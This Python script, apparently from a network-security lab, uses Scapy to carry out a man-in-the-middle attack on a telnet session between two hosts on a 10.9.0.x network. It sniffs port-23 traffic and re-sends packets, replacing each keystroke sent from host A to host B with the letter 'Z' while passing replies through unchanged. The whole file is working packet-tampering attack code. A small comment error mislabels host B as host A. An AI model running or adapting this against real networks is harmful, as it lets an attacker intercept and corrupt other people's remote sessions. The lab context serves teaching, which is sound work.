#!/usr/bin/env python3
from scapy.all import *

iface_ = 'eth0'
hostA = '10.9.0.5'  #IP address for host A
hostB = '10.9.0.6'  #IP address for host A
port = '23'

def main():
    #########################################################################
    # Here we do not want to capture any traffic that our program generates #
    #########################################################################
    filter_ = f'tcp port {port} && (not ether src 02:42:0a:09:00:69)'
    sniff(iface = iface_, filter = filter_, prn = spoof_pkt)
    
def spoof_pkt(pkt):
    if pkt[IP].src == hostA and pkt[IP].dst == hostB:
        # save a copy of the captured packet by first type casting it as binary data
        # then initialize it as an IP packet
        newpkt = IP(bytes(pkt[IP]))
        del(newpkt.chksum)              # force recalculation of IP checksum
        del(newpkt[TCP].payload)        # delete existing payload
        del(newpkt[TCP].chksum)         # force recalculation of TCP checksum
        
        # Check if payload exists and spoof
        if pkt[TCP].payload:
            data = (pkt[TCP].payload.load).decode()     # decodes the payload so we can work on it
            if (data == '\r\x00') or (data == '\r\n'):
                send(newpkt / Raw(load = data), verbose=0)
            else:
                newdata = 'Z'                           # replaces the payload with 'Z'
                send(newpkt / Raw(load = newdata), verbose=0)
        else:
            send(newpkt, verbose=0)
    elif pkt[IP].src == hostB and pkt[IP].dst == hostA:
        newpkt = IP(bytes(pkt[IP]))
        del(newpkt.chksum)
        del(newpkt[TCP].payload)
        del(newpkt[TCP].chksum)
        
        # Check for payload and replace
        if pkt[TCP].payload:
            data = (pkt[TCP].payload.load).decode()
            newdata = data
            send(newpkt / Raw(load = data), verbose=0)
        else:
            send(newpkt, verbose=0)
                      
                
if __name__ == '__main__':
    main()
